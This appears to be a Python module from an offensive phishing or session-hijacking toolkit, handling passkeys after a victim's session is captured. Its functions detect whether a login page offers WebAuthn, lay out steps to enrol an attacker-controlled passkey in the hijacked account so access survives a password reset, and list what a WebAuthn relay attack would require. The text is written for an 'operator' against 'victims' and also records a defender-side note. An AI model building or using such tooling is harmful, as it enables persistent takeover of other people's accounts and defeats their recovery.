# ============================================================================
"""Passkeys: what a captured session can do about them.

Two different problems, and they are not the same size.

**Enrolment after capture (implemented).** With a live session you can ADD a passkey to the
account - the same "add a device" flow the user would use. That gives durable,
phishing-resistant access that survives a password reset, because it is a real credential the
account now trusts. It runs inside the victim's own browser session (the browser task runner
drives it) and the tenant's policy can refuse it (a security-key-only or admin-managed
policy).

**Hybrid relay (NOT implemented, and said so).** Relaying the WebAuthn ceremony itself - so
the victim's phone signs for a domain the attacker controls - needs a CTAP2 relay, a
phone-side emulator that completes the ceremony against the REAL origin, and an
attestation story that survives. That is a research project, not a feature, and pretending
otherwise would be the kind of claim that gets an operator burned. `relay_feasibility()`
returns what it would take.

**Detection.** The collector reports whether the login surface offers a passkey, and whether
the account already has one, which decides whether enrolment is even worth attempting.
"""
import time

__all__ = ["detect", "enrolment_plan", "relay_feasibility", "describe", "PASSKEY_HINTS"]

# Strings a login page (or its JS bundle) contains when it offers a passkey.
PASSKEY_HINTS = ("webauthn", "navigator.credentials.create", "publickey",
                 "passkey", "fido2", "authenticatorSelection", "residentKey",
                 "attestationObject", "clientExtensionResults")


def detect(page_text="", intel=None, ua=""):
    """Does this login surface offer a passkey?

    `page_text` is the served HTML/JS and `intel` the collector's summary; a hit in either is
    evidence, and the absence of both is reported as UNKNOWN rather than "no passkeys",
    because a login page can load its auth library later.
    """
    text = (page_text or "").lower()
    hits = sorted({h for h in PASSKEY_HINTS if h in text})
    intel = intel or {}
    modules = intel.get("mods") or {}
    webauthn = modules.get("webauthn") or intel.get("webauthn")
    if webauthn:
        hits.append("collector-webauthn")
    return {"offers_passkey": bool(hits), "evidence": hits,
            "checked_page": bool(page_text), "checked_intel": bool(intel),
            "verdict": "offers" if hits else ("unknown" if not (page_text or intel) else "no")}


def enrolment_plan(display_name="Security key", timeout_ms=120000):
    """The steps to add a passkey to the captured account from the live session.

    Returned as a plan, not as a silent action: enrolling a credential in someone's account is
    a durable change, and the operator decides when it happens.
    """
    return {
        "kind": "webauthn-registration",
        "where": "the account's security settings, inside the captured browser session",
        "display_name": display_name,
        "timeout_ms": timeout_ms,
        "steps": [
            "open the security/keys page with the live session",
            "click add-a-passkey (the label differs per tenant)",
            "complete the platform ceremony (the browser's own prompt)",
            "record the credential id and the relying party in the vault",
        ],
        "refused_when": [
            "the tenant requires a security key or an admin-managed attestation",
            "the account has an authentication-method policy that forbids user-added passkeys",
            "the session is not CAE-fresh (a stale session cannot change credentials)",
        ],
        "created": time.time(),
    }


def relay_feasibility():
    """What a real WebAuthn relay would need. Not implemented, and this says why."""
    return {
        "implemented": False,
        "why_not": ("relaying the ceremony needs a CTAP2 relay plus a phone-side emulator that "
                    "completes the ceremony against the REAL origin; the attestation must also "
                    "survive, or the tenant refuses the credential"),
        "would_need": [
            "a WebAuthn proxy that forwards create/get requests to the victim's authenticator",
            "a transport that survives the origin binding (the RP id must stay the real domain)",
            "a phone-side component (a real authenticator, or an emulator with its own key)",
            "an attestation policy story for tenants that require one",
        ],
        "defender_side": ("the RP sees one credential, one attestation and one origin; a relay "
                          "is hard to tell from a slow legitimate ceremony, which is why the "
                          "control is a hardware-bound authenticator, not detection"),
    }


def describe(report):
    lines = [f"passkey: {report.get('verdict', 'unknown')}"]
    if report.get("evidence"):
        lines.append(f"  evidence: {', '.join(report['evidence'][:6])}")
    if report.get("verdict") == "unknown":
        lines.append("  - neither the page nor the collector was inspected: unknown, not 'no'")
    return "\n".join(lines)


